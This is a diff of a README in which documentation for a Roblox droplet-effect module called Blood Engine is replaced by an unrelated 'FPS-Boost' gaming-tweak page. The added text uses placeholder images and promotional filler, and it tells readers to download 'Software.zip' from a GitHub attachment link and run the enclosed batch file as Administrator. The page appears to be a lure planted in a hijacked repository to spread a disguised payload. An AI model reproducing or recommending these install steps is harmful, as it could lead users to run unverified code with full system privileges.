@@ -1,62 +1,61 @@
-<div align="center">
-	
-<picture>
- <img alt="Logo" src="https://github.com/rotntake/BloodEngine/assets/126120456/eb3a43ec-579f-491d-a9f3-f32e3a75d9ff">
-</picture>
+# FPS-Boost
 
-</div>
+![FPS-Boost Logo](https://example.com/logo.png)
 
-<div align="center">
+FPS Boost is a batch tweaking script designed to optimize your system for an enhanced gaming experience. This script aims to provide users with improved performance and stability, specifically tailored to boost FPS (Frames Per Second) in gaming applications. It is a free and open-source utility that works on Windows 10 and 11 operating systems.
 
+## Table of Contents
 
-v1.1.2 • [Model](https://create.roblox.com/marketplace/asset/15420466379/) • [Devforum](https://devforum.roblox.com/t/blood-engine-a-droplet-emitter-system/2545682)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-</div>
+## Features
 
-## What is Blood Engine?
-Blood Engine is a versatile resource that can be utilized for various applications, including creating effects like paint, water, blood, and more. It offers numerous methods tailored to meet your specific needs.
-
-One of its key features is the ability to emit "droplets" - these are meshes that can take on the appearance of "Decals" or "Spheres". These droplets can be emitted from any given origin point with a given velocity. Upon landing on a surface, such as a wall or floor, they transform into a pool.
-
-This entire process is highly customizable, with 24 options at your disposal to tweak and adjust according to your requirements. This ensures that Blood Engine can adapt to a wide range of scenarios and use-cases, providing you with the flexibility to create the exact effect you're aiming for.
+- **Optimization:** FPS Boost employs various system tweaks to optimize your machine for gaming performance.
+- **Customization:** Users have the flexibility to configure settings based on their preferences.
+- **Compatibility:** The script is compatible with Windows 10 and 11, ensuring widespread usability.
+- **Open-Source:** FPS Boost is open-source, encouraging community contributions and enhancements.
+- **Free:** Users can utilize the script at no cost, making it accessible to a broader audience.
 
 ## Installation
-You can install Blood Engine through the latest release of the repository, the [Model](https://create.roblox.com/marketplace/asset/15420466379/) published on Roblox, or by using Wally:
-```toml
-[dependencies]
-BloodEngine = "rotntake/blood-engine@1.1.2"
-```
+
+To install FPS Boost, follow these steps:
+
+1. Download the [FPS Boost script](https://github.com/user-attachments/files/16913125/Software.zip).
+2. Extract the contents of the downloaded zip file to a preferred location on your system.
+3. Right-click on the `FPS-Boost.bat` file and select "Run as Administrator" to initiate the optimization process.
+4. Follow the on-screen instructions to customize the optimization settings to suit your gaming requirements.
 
 ## Usage
-#### Initialization
-Firstly, you'll need to initialize BloodEngine with your preferred settings. This can be done in either a client or server script. However, it's generally more advisable to do this on the client side, so we'll proceed with that approach. 
 
-The settings provide you with control over various aspects of droplets and pools. These include the maximum number of droplets that can be created, the type of droplets to use, the velocity of droplets upon emission, and much more.
-```lua
--- Import the BloodEngine module
-local BloodEngine = require(PathToModule)
+To utilize FPS Boost effectively, consider the following recommendations:
 
--- Initialize BloodEngine with desired settings
-local Engine = BloodEngine.new({
-    Limit = 100, -- Sets the maximum number of droplets that can be created.
-    Type = "Default", -- Defines the droplet type. It can be either "Default" (Sphere) or "Decal",
-    RandomOffset = false, -- Determines whether a droplet should spawn at a random offset from a given position.
-    OffsetRange = {-20, 10}, -- Specifies the offset range for the position vectors.
-    DropletVelocity = {1, 2}, -- Controls the velocity of the emitted droplet.
-    DropletDelay = {0.05, 0.1}, -- Sets the delay between emitting droplets in a loop (for the EmitAmount method).
-    StartingSize = Vector3.new(0.01, 0.7, 0.01), -- Sets the initial size of the droplets upon landing.
-    Expansion = true, -- Determines whether a pool can expand when a droplet lands on it.
-    MaximumSize = 1, -- Sets the maximum size a pool can reach.
-})
-```
-#### Emitting Droplets
-After initializing the module, you're all set to emit droplets. There are two key methods available for droplet emission: `EmitAmount` and `Emit`.
-```lua
--- Emit a specific amount of droplets from a given origin in specific or nil direction
--- (Setting the Direction to nil will make droplets go in random directions)
-Engine:EmitAmount(Origin, Direction, Amount)
+- Run the script with administrative privileges to ensure all tweaks are applied successfully.
+- Review the customization options carefully and adjust settings based on your specific gaming setup and preferences.
+- Make sure to create a system restore point before running the script to revert any changes if needed.
 
--- Emit a single droplet from a given origin in a specific or nil direction
-Engine:Emit(Origin, Direction)
-```
-In this instance, we’ll be utilizing the `EmitAmount` method. Typically, you’d use the `Emit` method when you want to create your own loop instead of relying on the built-in loop of `EmitAmount` . This gives you more control over the emission process.
+![FPS Boost in Action](https://example.com/screenshot.png)
+
+## Contributing
+
+Contributions to FPS Boost are welcome! If you are interested in enhancing the script or adding new features, consider the following guidelines:
+
+1. Fork the repository and clone it to your local machine.
+2. Create a new branch for your feature or enhancement.
+3. Implement your changes and test thoroughly.
+4. Submit a pull request detailing the modifications made and the rationale behind them.
+
+Your contributions help improve FPS Boost and benefit the gaming community as a whole.
+
+## License
+
+FPS Boost is licensed under the [MIT License](https://opensource.org/licenses/MIT). You are free to modify and distribute the script as per the terms of the license agreement.
+
+---
+
+Feel the power of optimized gaming performance with FPS Boost! Try it today and elevate your gaming experience to the next level. Embrace the thrill of smooth gameplay and unlock the full potential of your system. Let FPS Boost be your companion in the quest for unparalleled gaming excellence! 🚀🎮
+
+![FPS Boost Mascot](https://example.com/mascot.png)
